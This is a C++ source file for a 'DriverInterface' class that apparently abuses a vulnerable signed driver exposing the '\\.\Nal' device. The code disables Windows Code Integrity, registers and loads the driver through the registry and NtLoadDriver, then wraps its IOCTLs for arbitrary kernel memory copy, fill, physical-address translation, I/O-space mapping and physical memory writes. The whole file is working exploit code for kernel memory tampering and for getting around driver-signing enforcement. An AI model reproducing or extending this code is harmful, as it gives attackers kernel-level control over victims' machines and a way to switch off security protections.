#include "Driver.h"

DriverInterface::DriverInterface(bool debug) {
	std::wstring wsDriverPath = WriteDriverToFile();
	bool success = CheckAndDisableDriverCheck(debug);
	if (success) printf("[*] Succsessfully disabled Code Integrity.\n");
	else exit(-1);
	this->debug = debug;

	DBGPRINT("\n[+] Loading driver at path %ws...\n", wsDriverPath.c_str());
	if (this->DeviceExists()) {
		printf("Another instance of the driver exists. Please restart your computer or unload the driver.\n");
		exit(-1);
	}
	
	this->wsServiceName = DRIVER_NAME;

	std::wstring wsServicePath = L"SYSTEM\\CurrentControlSet\\Services\\" + this->wsServiceName;
	std::wstring wsGlobalPath = L"\\??\\" + wsDriverPath;

	DBGPRINT("[d] Creating registry key for service: \n")
	DBGPRINT("---- Key path: %ws\n", wsServicePath.c_str());
	DBGPRINT("---- Global driver path: %ws\n", wsGlobalPath.c_str());

	HKEY hServiceKey;
	LSTATUS status = RegCreateKey(HKEY_LOCAL_MACHINE, wsServicePath.c_str(), &hServiceKey);
	if (status != ERROR_SUCCESS) {
		printf("[!] Couldn't create service key. Stopping...\n");
		exit(-1);
	}

	status = RegSetKeyValue(hServiceKey, NULL, L"ImagePath", REG_EXPAND_SZ, wsGlobalPath.c_str(), (DWORD)(wsGlobalPath.size() * sizeof(WCHAR)));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(hServiceKey);
		printf("[!] Couldn't create ImagePath registry value. Stopping...\n");
		exit(-1); 
	}

	DWORD ServiceTypeKernel = 1;
	status = RegSetKeyValue(hServiceKey, NULL, L"Type", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(hServiceKey);
		printf("[!] Couldn't create Type registry value. Stopping...\n");
		exit(-1);
	}

	RegCloseKey(hServiceKey);

	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	if (ntdll == 0) {
		printf("[!] Couldn't open ntdll.dll. Stopping...\n");
		exit(-1);
	}

	fNtLoadDriver NtLoadDriver = (fNtLoadDriver) GetProcAddress(ntdll, "NtLoadDriver");
	std::wstring wsDriverServicePath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
	wsDriverServicePath += DRIVER_NAME;
	UNICODE_STRING DriverServicePath;
	RtlInitUnicodeString(&DriverServicePath, wsDriverServicePath.c_str());
	status = NtLoadDriver(&DriverServicePath);
	DBGPRINT("[+] NtLoadDriver status: 0x%hhX\n", status);

	if (DeviceExists())
		printf("[+] Successfully loaded the driver.\n");

	hDevice = CreateFile(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DBGPRINT("[+] Opened the device handle: %p\n", hDevice);
}

DriverInterface::~DriverInterface() {
	CloseHandle(hDevice);
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	if (ntdll == 0) {
		printf("[!] Couldn't open ntdll.dll. Stopping...\n");
		exit(-1);
	}

	fNtLoadDriver NtUnloadDriver  = (fNtLoadDriver)GetProcAddress(ntdll, "NtUnloadDriver");
	std::wstring wsDriverServicePath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
	wsDriverServicePath += DRIVER_NAME;
	UNICODE_STRING DriverServicePath;
	RtlInitUnicodeString(&DriverServicePath, wsDriverServicePath.c_str());
	NTSTATUS status = NtUnloadDriver(&DriverServicePath);
	DBGPRINT("[+] NtUnloadDriver status: 0x%hhX\n", status);
}

bool DriverInterface::DeviceExists() {
	HANDLE hDeviceHandle = CreateFile(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDeviceHandle != nullptr && hDeviceHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(hDeviceHandle);
		return true;
	}
	return false;
}

bool DriverInterface::VirtualMemoryCopy(DWORD64 destination, DWORD64 source, DWORD64 size) {
	if (!destination || !source || !size)
		return 0;

	Driver_IOCTL::COPY_MEMORY_BUFFER_INFO CopyInformation = { 0 };

	CopyInformation.case_number = 0x33;
	CopyInformation.source = source;
	CopyInformation.destination = destination;
	CopyInformation.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, ioctl, &CopyInformation, sizeof(CopyInformation), nullptr, 0, &bytes_returned, nullptr);
}

bool DriverInterface::VirtualSetMemory(DWORD64 address, DWORD value, DWORD64 size) {
	if (!address || !size)
		return 0;

	Driver_IOCTL::FILL_MEMORY_BUFFER_INFO FillMemoryInfo = { 0 };

	FillMemoryInfo.case_number = 0x30;
	FillMemoryInfo.destination = address;
	FillMemoryInfo.value = value;
	FillMemoryInfo.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, ioctl, &FillMemoryInfo, sizeof(FillMemoryInfo), nullptr, 0, &bytes_returned, nullptr);
}

bool DriverInterface::GetPhysicalAddress(DWORD64 address, DWORD64* out_physical_address) {
	if (!address)
		return 0;

	Driver_IOCTL::GET_PHYS_ADDRESS_BUFFER_INFO GetPhysicalAddressInfo = { 0 };

	GetPhysicalAddressInfo.case_number = 0x25;
	GetPhysicalAddressInfo.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hDevice, ioctl, &GetPhysicalAddressInfo, sizeof(GetPhysicalAddressInfo), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = GetPhysicalAddressInfo.return_physical_address;
	return true;
}

DWORD64 DriverInterface::MapIoSpace(DWORD64 physical_address, DWORD size) {
	if (!physical_address || !size)
		return 0;

	Driver_IOCTL::MAP_IO_SPACE_BUFFER_INFO MapIoSpaceInfo = { 0 };

	MapIoSpaceInfo.case_number = 0x19;
	MapIoSpaceInfo.physical_address_to_map = physical_address;
	MapIoSpaceInfo.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hDevice, ioctl, &MapIoSpaceInfo, sizeof(MapIoSpaceInfo), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return MapIoSpaceInfo.return_virtual_address;
}

bool DriverInterface::UnmapIoSpace(DWORD64 address, DWORD size) {
	if (!address || !size)
		return false;

	Driver_IOCTL::UNMAP_IO_SPACE_BUFFER_INFO UnmapIoSpaceInfo = { 0 };

	UnmapIoSpaceInfo.case_number = 0x1A;
	UnmapIoSpaceInfo.virt_address = address;
	UnmapIoSpaceInfo.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(hDevice, ioctl, &UnmapIoSpaceInfo, sizeof(UnmapIoSpaceInfo), nullptr, 0, &bytes_returned, nullptr);
}

bool DriverInterface::ReadMemory(DWORD64 address, PVOID buffer, DWORD64 size) {
	return this->VirtualMemoryCopy(reinterpret_cast<DWORD64>(buffer), address, size);
}

bool DriverInterface::WriteMemory(DWORD64 address, PVOID buffer, DWORD64 size) {
	return this->VirtualMemoryCopy(address, reinterpret_cast<DWORD64>(buffer), size);
}

bool DriverInterface::PhysicalWrite(DWORD64 address, PVOID buffer, DWORD size) {
	if (!address || !buffer || !size)
		return false;

	DWORD64 physical_address;
	bool success = this->GetPhysicalAddress(address, &physical_address);
	if (!success) return false;

	DWORD64 mapped_physical_memory = this->MapIoSpace(physical_address, size);
	if (!mapped_physical_memory) return false;

	success = this->WriteMemory(mapped_physical_memory, buffer, size);
	UnmapIoSpace(mapped_physical_memory, size);

	return success;
}
